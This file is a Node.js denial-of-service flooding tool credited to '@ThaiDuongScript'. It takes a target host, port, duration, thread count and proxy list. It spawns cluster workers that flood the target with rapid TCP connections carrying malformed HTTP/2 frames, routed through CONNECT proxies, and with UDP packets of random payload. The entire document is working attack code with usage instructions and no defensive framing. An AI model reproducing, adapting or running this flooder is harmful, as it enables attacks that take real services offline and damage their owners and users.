const net = require('net');
const dgram = require('dgram');
const cluster = require('cluster');
const os = require('os');
const fs = require('fs'); // Thêm module fs để đọc file
function encodeFrame(streamId, type, payload = "", flags = 0) {
    const frame = Buffer.alloc(9 + payload.length);
    frame.writeUInt32BE(payload.length << 8 | type, 0);
    frame.writeUInt8(flags, 4);
    frame.writeUInt32BE(streamId, 5);
    if (payload.length > 0) frame.set(payload, 9);
    return frame;
}
function encodeSettings(settings) {
    const data = Buffer.alloc(6 * settings.length);
    for (let i = 0; i < settings.length; i++) {
        data.writeUInt16BE(settings[i][0], i * 6);
        data.writeUInt32BE(settings[i][1], i * 6 + 2);
    }
    return data;
}
const PREFACE = "PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n";
const updateWindow = Buffer.alloc(4);
    updateWindow.writeUInt32BE(Math.floor(Math.random() * (19963105 - 15663105 + 1)) + 15663105, 0);
const frames = [
Buffer.from(PREFACE, 'binary'),
encodeFrame(0, 4, encodeSettings([
[1, 65535],
[2, 0],
[4, 6291456],
[6, 262144],
])),
encodeFrame(0, 8, updateWindow)
];


const packed = Buffer.concat([
                    Buffer.from([0x80, 0, 0, 0, 0xFF]),
                    
                ]);

let streamId =1;


const flags = 0x1 | 0x4 | 0x8 | 0x20;
const encodedFrame = encodeFrame(streamId, 1, packed, flags);
const frame = Buffer.concat([encodedFrame]);


const [,, targetHost, targetPortStr, durationStr, threadsStr, mode, proxyFile] = process.argv; // Thêm proxyFile vào arguments

const targetPort = parseInt(targetPortStr);
const duration = parseInt(durationStr);
const threads = parseInt(threadsStr) || os.cpus().length;
const attackMode = (mode || 'both').toLowerCase();

if (!targetHost || !targetPort || !duration || !threads || !['tcp', 'udp', 'both'].includes(attackMode)) {
    console.log('Made by @ThaiDuongScript')
    console.log('Usage: node layer4_burst_mode.js <host> <port> <duration_sec> <threads> <mode: tcp|udp|both> <proxy_file>');
    process.exit(1);
}

let proxies = [];
if (proxyFile) {
    try {
        const data = fs.readFileSync(proxyFile, 'utf8');
        proxies = data.split('\n').filter(line => line.trim() !== '').map(line => {
            const [ip, port] = line.split(':');
            return { ip: ip.trim(), port: parseInt(port) };
        });
        console.log(`[Master] Loaded ${proxies.length} proxies from ${proxyFile}`);
    } catch (e) {
        console.error(`[Master] Error reading proxy file: ${e.message}`);
        process.exit(1);
    }
}


function randomPayload(length = 64) {
    const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
    let data = '';
    for (let i = 0; i < length; i++) {
        data += chars.charAt(Math.floor(Math.random() * chars.length));
    }
    return Buffer.from(data);
}


function getRandomProxy() {
    if (proxies.length === 0) return null;
    return proxies[Math.floor(Math.random() * proxies.length)];
}

function floodLoop() {
    const udpSocket = dgram.createSocket('udp4');
    let packetsSent = 0;

    setInterval(() => {
        if (attackMode === 'tcp' || attackMode === 'both') {
            const tcp = new net.Socket();
            tcp.setNoDelay(true);

            const proxy = getRandomProxy();
            if (proxy) {
                tcp.connect(proxy.port, proxy.ip, () => {
                    tcp.write(`CONNECT ${targetHost}:${targetPort} HTTP/1.1\r\nHost: ${targetHost}\r\n\r\n`);

                    tcp.once('data', (data) => {
                        if (data.includes('HTTP/1.1 200 Connection established')) {
                            setTimeout(() => {
                                for (let i = 0; i < threads; i++) {
                                    tcp.write(Buffer.concat([
                  encodeFrame(streamId, 0x3, Buffer.from([0x0, 0x0, 0x8, 0x0]), 0x0),
                  frames
                 ]));
                                    packetsSent++;
                                }
                            }, 0);
                            setTimeout(() => tcp.destroy(), 1000);
                        } else {
                         //   console.log(`[Worker ${cluster.worker.id}] Proxy connection failed: ${data.toString()}`);
                            tcp.destroy();
                        }
                    });
                });
            } else {
                tcp.connect(targetPort, targetHost, () => {
                    setTimeout(() => {
                        for (let i = 0; i < threads; i++) {
                            tcp.write(Buffer.concat([
                  encodeFrame(streamId, 0x3, Buffer.from([0x0, 0x0, 0x8, 0x0]), 0x0),
                  frames
                 ]));
                            packetsSent++;
                        }
                    }, 100);
                    setTimeout(() => tcp.destroy(), 500);
                });
            }

            tcp.on('error', (err) => {
                //console.error(`[Worker ${cluster.worker.id}] TCP error: ${err.message}`);
            });
        }

        if (attackMode === 'udp' || attackMode === 'both') {
            for (let i = 0; i < threads; i++) {
                const msg = randomPayload(64);
                
                const proxy = getRandomProxy();
                if (proxy) {


                    udpSocket.send(msg, 0, msg.length, proxy.port, proxy.ip, (err) => {
                        if (err) {
                            //console.error(`[Worker ${cluster.worker.id}] UDP send error: ${err.message}`);
                        }
                        packetsSent++;
                    });
                } else {
                    udpSocket.send(msg, 0, msg.length, targetPort, targetHost, () => {
                        packetsSent++;
                    });
                }
            }
        }
        console.log(`[Worker ${cluster.worker.id}] | Packet: ${packetsSent}`);
    }, 1);
}


if (cluster.isPrimary) {
    console.log(`[Master] started ${attackMode.toUpperCase()} flood to ${targetHost}:${targetPort} in ${duration}s with ${threads} threads`);
    for (let i = 0; i < threads; i++) cluster.fork();
    setTimeout(() => {
        console.log(`[Master] Kết thúc.`);
        process.exit(0);
    }, duration * 1000);
} else {
    floodLoop();
}